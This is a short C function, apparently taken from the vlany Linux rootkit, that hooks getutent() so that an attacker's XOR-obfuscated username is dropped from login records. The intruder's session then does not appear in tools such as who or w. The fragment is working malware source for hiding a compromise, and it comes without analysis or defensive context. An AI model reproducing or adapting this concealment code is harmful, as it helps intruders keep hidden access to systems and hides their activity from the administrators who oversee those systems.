struct utmp *getutent(void)
{
    #ifdef DEBUG
        printf("[vlany] getutent() called\n");
    #endif

    HOOK(old_getutent, CGETUTENT);

    struct utmp *tmp;
    tmp = old_getutent();

    if(tmp && tmp->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->ut_user, vlany_user))
        {
            CLEAN(vlany_user);
            errno = ESRCH; // sorry sir we could not find your user
            return NULL;
        }
        CLEAN(vlany_user);
    }

    return tmp;
}
